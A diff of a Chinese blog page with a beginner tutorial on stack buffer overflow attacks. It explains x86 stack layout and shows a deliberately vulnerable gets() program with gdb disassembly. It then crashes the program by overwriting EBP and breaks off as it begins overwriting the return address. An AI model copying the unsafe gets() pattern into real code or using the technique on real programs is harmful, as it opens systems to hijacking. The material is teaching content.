@@ -1,1816 +1,404 @@
 <!DOCTYPE html>
 <html>
-
 <head>
   <meta charset="utf-8">
-
+  
   <title>缓冲区溢出攻击 | 彼岸-未来的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。">
-  <meta property="og:type" content="article">
-  <meta property="og:title" content="缓冲区溢出攻击">
-  <meta property="og:url" content="http://science09.github.io/2014/07/31/缓冲区溢出攻击/index.html">
-  <meta property="og:site_name" content="彼岸-未来的博客">
-  <meta property="og:description" content="缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。">
-  <meta property="og:updated_time" content="2015-09-10T13:52:34.000Z">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="缓冲区溢出攻击">
-  <meta name="twitter:description" content="缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。">
-
-  <link rel="alternative" href="/atom.xml" title="彼岸-未来的博客" type="application/atom+xml">
-
-  <link rel="icon" href="/favicon.ico" type="image/x-ico">
-
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区溢出攻击">
+<meta property="og:url" content="http://science09.github.io/2014/07/31/缓冲区溢出攻击/index.html">
+<meta property="og:site_name" content="彼岸-未来的博客">
+<meta property="og:description" content="缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。">
+<meta property="og:updated_time" content="2015-09-10T13:52:34.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="缓冲区溢出攻击">
+<meta name="twitter:description" content="缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。">
+  
+    <link rel="alternative" href="/atom.xml" title="彼岸-未来的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico" type="image/x-ico">
+  
   <link rel="stylesheet" href="/css/style.css" type="text/css">
   <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "//hm.baidu.com/hm.js?ae9c0d06cbefcb5fa4d7988f4c49cb6c";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-
-  </script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?ae9c0d06cbefcb5fa4d7988f4c49cb6c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
 </head>
-
 <body>
   <div id="container">
     <div class="left-col">
-      <div class="overlay"></div>
-      <div class="intrude-less">
-        <header id="header" class="inner">
-          <a href="/" class="profilepic">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://tp2.sinaimg.cn/2445097485/180/5736689505/1" class="js-avatar">
+			
+		</a>
 
-            <img lazy-src="http://tp2.sinaimg.cn/2445097485/180/5736689505/1" class="js-avatar">
+		<hgroup>
+		  <h1 class="header-author"><a href="/">science09</a></h1>
+		</hgroup>
 
-          </a>
+		
+		<p class="header-subtitle">一分耕耘一分收获</p>
+		
 
-          <hgroup>
-            <h1 class="header-author">
-              <a href="/">science09</a>
-            </h1>
-          </hgroup>
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						
+						<li>关于我</li>
+						
+					</ul>
+				</div>
+			</div>
+		
 
-          <p class="header-subtitle">一分耕耘一分收获</p>
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/science09" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/u/2445097485" title="weibo">weibo</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="zhihu" target="_blank" href="/#" title="zhihu">zhihu</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Android库/" style="font-size: 10px;">Android库</a> <a href="/tags/Android开发/" style="font-size: 10px;">Android开发</a> <a href="/tags/CSS/" style="font-size: 10px;">CSS</a> <a href="/tags/Express/" style="font-size: 10px;">Express</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Intent/" style="font-size: 10px;">Intent</a> <a href="/tags/Java/" style="font-size: 15px;">Java</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Material/" style="font-size: 10px;">Material</a> <a href="/tags/MongoDB/" style="font-size: 10px;">MongoDB</a> <a href="/tags/Node-js/" style="font-size: 15px;">Node.js</a> <a href="/tags/Parcelable/" style="font-size: 10px;">Parcelable</a> <a href="/tags/Volley/" style="font-size: 10px;">Volley</a> <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a> <a href="/tags/XMLRequest/" style="font-size: 10px;">XMLRequest</a> <a href="/tags/XML解析/" style="font-size: 10px;">XML解析</a> <a href="/tags/app/" style="font-size: 10px;">app</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/github/" style="font-size: 15px;">github</a> <a href="/tags/ionic/" style="font-size: 10px;">ionic</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/swift/" style="font-size: 10px;">swift</a> <a href="/tags/webview/" style="font-size: 10px;">webview</a> <a href="/tags/免费域名/" style="font-size: 10px;">免费域名</a> <a href="/tags/内存泄露/" style="font-size: 10px;">内存泄露</a> <a href="/tags/内存管理/" style="font-size: 10px;">内存管理</a> <a href="/tags/前端框架/" style="font-size: 10px;">前端框架</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a> <a href="/tags/反编译/" style="font-size: 10px;">反编译</a> <a href="/tags/开发/" style="font-size: 10px;">开发</a> <a href="/tags/性能优化/" style="font-size: 10px;">性能优化</a> <a href="/tags/攻击/" style="font-size: 10px;">攻击</a> <a href="/tags/缓冲区溢出/" style="font-size: 10px;">缓冲区溢出</a> <a href="/tags/设计模式/" style="font-size: 10px;">设计模式</a> <a href="/tags/邮件/" style="font-size: 10px;">邮件</a> <a href="/tags/面试/" style="font-size: 15px;">面试</a>
+					</div>
+				</section>
+				
+				
+				
 
-          <div class="switch-btn">
-            <div class="icon">
-              <div class="icon-ctn">
-                <div class="icon-wrap icon-house" data-idx="0">
-                  <div class="birdhouse"></div>
-                  <div class="birdhouse_holes"></div>
-                </div>
-                <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                  <div class="ribbon"></div>
-                </div>
-
-                <div class="icon-wrap icon-me hide" data-idx="3">
-                  <div class="user"></div>
-                  <div class="shoulder"></div>
-                </div>
-
-              </div>
-
-            </div>
-            <div class="tips-box hide">
-              <div class="tips-arrow"></div>
-              <ul class="tips-inner">
-                <li>菜单</li>
-                <li>标签</li>
-
-                <li>关于我</li>
-
-              </ul>
-            </div>
-          </div>
-
-          <div class="switch-area">
-            <div class="switch-wrap">
-              <section class="switch-part switch-part1">
-                <nav class="header-menu">
-                  <ul>
-
-                    <li>
-                      <a href="/">主页</a>
-                    </li>
-
-                    <li>
-                      <a href="/archives">所有文章</a>
-                    </li>
-
-                  </ul>
-                </nav>
-                <nav class="header-nav">
-                  <div class="social">
-
-                    <a class="github" target="_blank" href="https://github.com/science09" title="github">github</a>
-
-                    <a class="weibo" target="_blank" href="http://weibo.com/u/2445097485" title="weibo">weibo</a>
-
-                    <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
-
-                    <a class="zhihu" target="_blank" href="/#" title="zhihu">zhihu</a>
-
-                  </div>
-                </nav>
-              </section>
-
-              <section class="switch-part switch-part2">
-                <div class="widget tagcloud" id="js-tagcloud">
-                  <a href="/tags/Android/" style="font-size: 20px;">Android</a>
-                  <a href="/tags/Android库/" style="font-size: 10px;">Android库</a>
-                  <a href="/tags/Android开发/" style="font-size: 10px;">Android开发</a>
-                  <a href="/tags/CSS/" style="font-size: 10px;">CSS</a>
-                  <a href="/tags/Express/" style="font-size: 10px;">Express</a>
-                  <a href="/tags/HTML/" style="font-size: 10px;">HTML</a>
-                  <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a>
-                  <a href="/tags/Intent/" style="font-size: 10px;">Intent</a>
-                  <a href="/tags/Java/" style="font-size: 15px;">Java</a>
-                  <a href="/tags/Linux/" style="font-size: 10px;">Linux</a>
-                  <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a>
-                  <a href="/tags/Material/" style="font-size: 10px;">Material</a>
-                  <a href="/tags/MongoDB/" style="font-size: 10px;">MongoDB</a>
-                  <a href="/tags/Node-js/" style="font-size: 15px;">Node.js</a>
-                  <a href="/tags/Parcelable/" style="font-size: 10px;">Parcelable</a>
-                  <a href="/tags/Volley/" style="font-size: 10px;">Volley</a>
-                  <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a>
-                  <a href="/tags/XMLRequest/" style="font-size: 10px;">XMLRequest</a>
-                  <a href="/tags/XML解析/" style="font-size: 10px;">XML解析</a>
-                  <a href="/tags/app/" style="font-size: 10px;">app</a>
-                  <a href="/tags/git/" style="font-size: 10px;">git</a>
-                  <a href="/tags/github/" style="font-size: 15px;">github</a>
-                  <a href="/tags/ionic/" style="font-size: 10px;">ionic</a>
-                  <a href="/tags/java/" style="font-size: 10px;">java</a>
-                  <a href="/tags/swift/" style="font-size: 10px;">swift</a>
-                  <a href="/tags/webview/" style="font-size: 10px;">webview</a>
-                  <a href="/tags/免费域名/" style="font-size: 10px;">免费域名</a>
-                  <a href="/tags/内存泄露/" style="font-size: 10px;">内存泄露</a>
-                  <a href="/tags/内存管理/" style="font-size: 10px;">内存管理</a>
-                  <a href="/tags/前端框架/" style="font-size: 10px;">前端框架</a>
-                  <a href="/tags/博客/" style="font-size: 10px;">博客</a>
-                  <a href="/tags/反编译/" style="font-size: 10px;">反编译</a>
-                  <a href="/tags/开发/" style="font-size: 10px;">开发</a>
-                  <a href="/tags/性能优化/" style="font-size: 10px;">性能优化</a>
-                  <a href="/tags/攻击/" style="font-size: 10px;">攻击</a>
-                  <a href="/tags/缓冲区溢出/" style="font-size: 10px;">缓冲区溢出</a>
-                  <a href="/tags/设计模式/" style="font-size: 10px;">设计模式</a>
-                  <a href="/tags/邮件/" style="font-size: 10px;">邮件</a>
-                  <a href="/tags/面试/" style="font-size: 15px;">面试</a>
-                </div>
-              </section>
-
-              <section class="switch-part switch-part3">
-
-                <div id="js-aboutme">我就是我，不一样的烟火!</div>
-              </section>
-
-            </div>
-          </div>
-        </header>
-      </div>
-
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">我就是我，不一样的烟火!</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
     </div>
     <div class="mid-col">
       <nav id="mobile-nav">
-        <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide">science09</h1>
-        </div>
-        <div class="intrude-less">
-          <header id="header" class="inner">
-            <div class="profilepic">
-              <img lazy-src="http://tp2.sinaimg.cn/2445097485/180/5736689505/1" class="js-avatar">
-            </div>
-            <hgroup>
-              <h1 class="header-author">science09</h1>
-            </hgroup>
-
-            <p class="header-subtitle">一分耕耘一分收获</p>
-
-            <nav class="header-menu">
-              <ul>
-
-                <li>
-                  <a href="/">主页</a>
-                </li>
-
-                <li>
-                  <a href="/archives">所有文章</a>
-                </li>
-
-                <div class="clearfix"></div>
-              </ul>
-            </nav>
-            <nav class="header-nav">
-              <div class="social">
-
-                <a class="github" target="_blank" href="https://github.com/science09" title="github">github</a>
-
-                <a class="weibo" target="_blank" href="http://weibo.com/u/2445097485" title="weibo">weibo</a>
-
-                <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
-
-                <a class="zhihu" target="_blank" href="/#" title="zhihu">zhihu</a>
-
-              </div>
-            </nav>
-          </header>
-        </div>
-      </nav>
-
-      <div class="body-wrap">
-        <article id="post-缓冲区溢出攻击" class="article article-type-post" itemscope itemprop="blogPost">
-
-          <div class="article-meta">
-            <a href="/2014/07/31/缓冲区溢出攻击/" class="article-date">
-              <time datetime="2014-07-31T15:24:42.000Z" itemprop="datePublished">2014-07-31</time>
-            </a>
-
-          </div>
-
-          <div class="article-inner">
-
-            <input type="hidden" class="isFancy" />
-
-            <header class="article-header">
-              <h1 class="article-title" itemprop="name">
-                缓冲区溢出攻击
-              </h1>
-
-            </header>
-
-            <div class="article-info article-info-post">
-              <div class="article-tag tagcloud">
-                <ul class="article-tag-list">
-                  <li class="article-tag-list-item">
-                    <a class="article-tag-list-link" href="/tags/攻击/">攻击</a>
-                  </li>
-                  <li class="article-tag-list-item">
-                    <a class="article-tag-list-link" href="/tags/缓冲区溢出/">缓冲区溢出</a>
-                  </li>
-                </ul>
-              </div>
-
-              <div class="article-category tagcloud">
-                <a class="article-category-link" href="/categories/技术/">技术</a>
-              </div>
-
-              <div class="clearfix"></div>
-            </div>
-
-            <div class="article-entry" itemprop="articleBody">
-
-              <p>缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。
-                <br>
-                <a id="more"></a>
-              </p>
-              <h4 id="1-内存">1.内存</h4>
-              <p>注：我这里的描述方式是在大多数计算机上内存是进程的组织者，但是它是依赖处理器体系结构的类型。这是一个x86的例子，同时也可以大致应用在sparc。</p>
-              <p>缓冲区溢出的攻击原理是不应该是重写随机输入和在进程中执行代码的内存的重写。要看在什么地方和怎么发生的溢出，让我们来看下内存是如何组织的。页面是使用自己相关地址的内存的一个部分，这就意味着内核的进程的初始化，这就没有必要知道在RAM中存储的物理地址。进程内存由下面三个部分组成：</p>
-              <p>代码段，在这一段代码中你的数据是通过汇编指令在处理器中执行的。该代码执行是非线性的，它可以跳过代码，跳跃，在某种条件下调用函数。以此，我们使用EIP指针，或是指针指令。其中EIP指向的地址总是包含下一个执行代码。</p>
-              <p>数据段，变量空间和动态缓冲器。</p>
-              <p>堆栈段，这是用来给函数传递变量的和和作为函数变量的空间。在栈的底部位于每一页的虚拟内存的尽头，同时向下增长。汇编命令PUSHL会增加到栈的顶部，POPL会从栈的顶部移除项目并且把它们放到寄存器中。要直接访问栈寄存器，在栈的顶部有栈顶指针ESP。</p>
-              <h4 id="2-函数">2.函数</h4>
-              <p>函数是一段代码段的代码，当被调用执行一个任务，之后返回执行的前一个主题。或是，把参数传递给函数，在汇编语言中，通常看起来是这样的。</p>
-              <figure class="highlight c">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">memory address code</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x8054321</span> pushl $
-                          <span class="number">0x0</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x8054322</span> call $
-                          <span class="number">0x80543a0</span>
-                        </span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x8054327</span> ret</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x8054328</span> leave</span>
-                        <br>
-                        <span class="line">...</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x80543a0</span> popl %eax</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x80543a1</span> addl $
-                          <span class="number">0x1337</span>,%eax</span>
-                        <br>
-                        <span class="line">
-                          <span class="number">0x80543a4</span> ret</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>这会发生什么?主函数调用了function(0);</p>
-              <p>变量是0，主要把它压入栈中，同时调用该函数。该函数使用popl来获取栈中的变量。完成后，返回0x8054327。通常，主函数要把EBP寄存器压入栈中，主要是储存和在结束后在储存。这是帧指针的概念，即允许函数使用自己的偏移地址，在对付攻击时就变的很无趣了。因为函数将不会返回到原有的执行线程。</p>
-              <p>我们只需要知道栈。在顶部，我们有函数的内部缓冲区和变量。在此之后，有保存的EBP寄存器(32位，4个字节)，然后返回地址，是另外的4个字节。再往下，还有要传递给函数的参数，这对我们没有用。</p>
-              <p>在这种情况下，我们返回的地址是0x8054327。在函数被调用时，它就会自动的存储到栈中。如果代码中存在溢出的地方，这个返回值会被覆盖，并且指针指向下内存中的下一个位置。</p>
-              <h4 id="3-一个可以利用的程序实例">3.一个可以利用的程序实例</h4>
-              <p>让我们假设我们要利用的函数为：</p>
-              <figure class="highlight">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                        <span class="line">10</span>
-                        <br>
-                        <span class="line">11</span>
-                        <br>
-                        <span class="line">12</span>
-                        <br>
-                        <span class="line">13</span>
-                        <br>
-                        <span class="line">14</span>
-                        <br>
-                        <span class="line">15</span>
-                        <br>
-                        <span class="line">16</span>
-                        <br>
-                        <span class="line">17</span>
-                        <br>
-                        <span class="line">18</span>
-                        <br>
-                        <span class="line">19</span>
-                        <br>
-                        <span class="line">20</span>
-                        <br>
-                        <span class="line">21</span>
-                        <br>
-                        <span class="line">22</span>
-                        <br>
-                        <span class="line">23</span>
-                        <br>
-                        <span class="line">24</span>
-                        <br>
-                        <span class="line">25</span>
-                        <br>
-                        <span class="line">26</span>
-                        <br>
-                        <span class="line">27</span>
-                        <br>
-                        <span class="line">28</span>
-                        <br>
-                        <span class="line">29</span>
-                        <br>
-                        <span class="line">30</span>
-                        <br>
-                        <span class="line">31</span>
-                        <br>
-                        <span class="line">32</span>
-                        <br>
-                        <span class="line">33</span>
-                        <br>
-                        <span class="line">34</span>
-                        <br>
-                        <span class="line">35</span>
-                        <br>
-                        <span class="line">36</span>
-                        <br>
-                        <span class="line">37</span>
-                        <br>
-                        <span class="line">38</span>
-                        <br>
-                        <span class="line">39</span>
-                        <br>
-                        <span class="line">40</span>
-                        <br>
-                        <span class="line">41</span>
-                        <br>
-                        <span class="line">42</span>
-                        <br>
-                        <span class="line">43</span>
-                        <br>
-                        <span class="line">44</span>
-                        <br>
-                        <span class="line">45</span>
-                        <br>
-                        <span class="line">46</span>
-                        <br>
-                        <span class="line">47</span>
-                        <br>
-                        <span class="line">48</span>
-                        <br>
-                        <span class="line">49</span>
-                        <br>
-                        <span class="line">50</span>
-                        <br>
-                        <span class="line">51</span>
-                        <br>
-                        <span class="line">52</span>
-                        <br>
-                        <span class="line">53</span>
-                        <br>
-                        <span class="line">54</span>
-                        <br>
-                        <span class="line">55</span>
-                        <br>
-                        <span class="line">56</span>
-                        <br>
-                        <span class="line">57</span>
-                        <br>
-                        <span class="line">58</span>
-                        <br>
-                        <span class="line">59</span>
-                        <br>
-                        <span class="line">60</span>
-                        <br>
-                        <span class="line">61</span>
-                        <br>
-                        <span class="line">62</span>
-                        <br>
-                        <span class="line">63</span>
-                        <br>
-                        <span class="line">64</span>
-                        <br>
-                        <span class="line">65</span>
-                        <br>
-                        <span class="line">66</span>
-                        <br>
-                        <span class="line">67</span>
-                        <br>
-                        <span class="line">68</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line">void lame (void) &#123; char small[30]; gets (small); printf("%s\n",
-                          small); &#125;
-                        </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">main() &#123; lame (); return 0; &#125;</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">Compile and disassemble it:</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line"># cc -ggdb blah.c -o blah</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/tmp/cca017401.o: In function `lame':</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/root/blah.c:1: the `gets' function is dangerous and should
-                          not be used.
-                        </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line"># gdb blah</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* short explanation: gdb, the GNU debugger is used here
-                          to read the
-                        </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line"> binary file and disassemble it (translate bytes to assembler
-                          code) */
-                        </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">(gdb) disas main</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">Dump of assembler code for function main:</span>
-                        <br>
-                        <span class="line">0x80484c8 : pushl %ebp</span>
-                        <br>
-                        <span class="line">0x80484c9 : movl %esp,%ebp</span>
-                        <br>
-                        <span class="line">0x80484cb : call 0x80484a0</span>
-                        <br>
-                        <span class="line">0x80484d0 : leave</span>
-                        <br>
-                        <span class="line">0x80484d1 : ret</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">(gdb) disas lame</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">Dump of assembler code for function lame:</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* saving the frame pointer onto the stack right before the
-                          ret address */
-                        </span>
-                        <br>
-                        <span class="line">0x80484a0 : pushl %ebp</span>
-                        <br>
-                        <span class="line">0x80484a1 : movl %esp,%ebp</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* enlarge the stack by 0×20 or 32. our buffer is 30 characters,
-                          but the</span>
-                        <br>
-                        <span class="line"> memory is allocated 4byte-wise (because the processor uses
-                          32bit words)
-                        </span>
-                        <br>
-                        <span class="line"> this is the equivalent to: char small[30]; */</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">0x80484a3 : subl $0×20,%esp </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* load a pointer to small[30] (the space on the stack, which
-                          is located
-                        </span>
-                        <br>
-                        <span class="line"> at virtual address 0xffffffe0(%ebp)) on the stack, and call</span>
-                        <br>
-                        <span class="line"> the gets function: gets(small); */</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">0x80484a6 : leal 0xffffffe0(%ebp),%eax</span>
-                        <br>
-                        <span class="line">0x80484a9 : pushl %eax</span>
-                        <br>
-                        <span class="line">0x80484aa : call 0x80483ec</span>
-                        <br>
-                        <span class="line">0x80484af : addl $0×4,%esp</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* load the address of small and the address of "%s\n" string
-                          on stack
-                        </span>
-                        <br>
-                        <span class="line"> and call the print function: printf("%s\n", small); */</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">0x80484b2 : leal 0xffffffe0(%ebp),%eax</span>
-                        <br>
-                        <span class="line">0x80484b5 : pushl %eax</span>
-                        <br>
-                        <span class="line">0x80484b6 : pushl $0x804852c</span>
-                        <br>
-                        <span class="line">0x80484bb : call 0x80483dc</span>
-                        <br>
-                        <span class="line">0x80484c0 : addl $0×8,%esp</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">/* get the return address, 0x80484d0, from stack and return
-                          to that address.
-                        </span>
-                        <br>
-                        <span class="line"> you don't see that explicitly here because it is done by
-                          the CPU as 'ret' */
-                        </span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">0x80484c3 : leave</span>
-                        <br>
-                        <span class="line">0x80484c4 : ret</span>
-                        <br>
-                        <span class="line"></span>
-                        <br>
-                        <span class="line">End of assembler dump.</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <h4 id="3-1_程序溢出">3.1 程序溢出</h4>
-              <figure class="highlight">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                        <span class="line">10</span>
-                        <br>
-                        <span class="line">11</span>
-                        <br>
-                        <span class="line">12</span>
-                        <br>
-                        <span class="line">13</span>
-                        <br>
-                        <span class="line">14</span>
-                        <br>
-                        <span class="line">15</span>
-                        <br>
-                      </pre>
-                    </td>
-                    <td class="code">
-                      <pre>
-                        <span class="line"># ./blah </span>
-                        <br>
-                        <span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- user input</span>
-                        <br>
-                        <span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
-                        <br>
-                        <span class="line"># ./blah </span>
-                        <br>
-                        <span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- user input</span>
-                        <br>
-                        <span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
-                        <br>
-                        <span class="line">Segmentation fault (core dumped)</span>
-                        <br>
-                        <span class="line"># gdb blah core</span>
-                        <br>
-                        <span class="line">(gdb) info registers</span>
-                        <br>
-                        <span class="line"> eax: 0×24 36</span>
-                        <br>
-                        <span class="line"> ecx: 0x804852f 134513967</span>
-                        <br>
-                        <span class="line"> edx: 0×1 1 </span>
-                        <br>
-                        <span class="line"> ebx: 0x11a3c8 1156040 </span>
-                        <br>
-                        <span class="line"> esp: 0xbffffdb8 -1073742408 </span>
-                        <br>
-                        <span class="line"> ebp: 0×787878 7895160</span>
-                        <br>
-                      </pre>
-                    </td>
-                  </tr>
-                </table>
-              </figure>
-              <p>EBP是0x787878，这就意味我们已经写入了超出缓冲区输入可以控制的范围。0x78的x是十六进制的标志。该过程有32个字节的最大的缓冲器。我们已经在内存中写入了比用户输入更多的数据，因此重写EBP和返回值的地址是’xxxx’，这个过程会尝试在地址0x787878处重复执行，这就会导致段的错误。</p>
-              <h4 id="3-2_改变返回值地址">3.2 改变返回值地址</h4>
-              <p>让我们尝试利用这个程序来返回lame()，我们要改变返回值的地址从0x80484d0到0x80484cb，在内存中，我们有32字节的缓冲区空间|4个字节保存EBP|4个字节的RET。下面是一个很简单的程序，把4个字节的返回地址变成一个1个字节字符缓冲区：</p>
-              <figure class="highlight c">
-                <table>
-                  <tr>
-                    <td class="gutter">
-                      <pre>
-                        <span class="line">1</span>
-                        <br>
-                        <span class="line">2</span>
-                        <br>
-                        <span class="line">3</span>
-                        <br>
-                        <span class="line">4</span>
-                        <br>
-                        <span class="line">5</span>
-                        <br>
-                        <span class="line">6</span>
-                        <br>
-                        <span class="line">7</span>
-                        <br>
-                        <span class="line">8</span>
-                        <br>
-                        <span class="line">9</span>
-                        <br>
-                        <span class="line">10</span>
-                        <br>
-                        <span class="line">11</span>
-                        <br>
-                        <span class="line">12</span>
-                        <br>
-                        <span class="line">13</span>
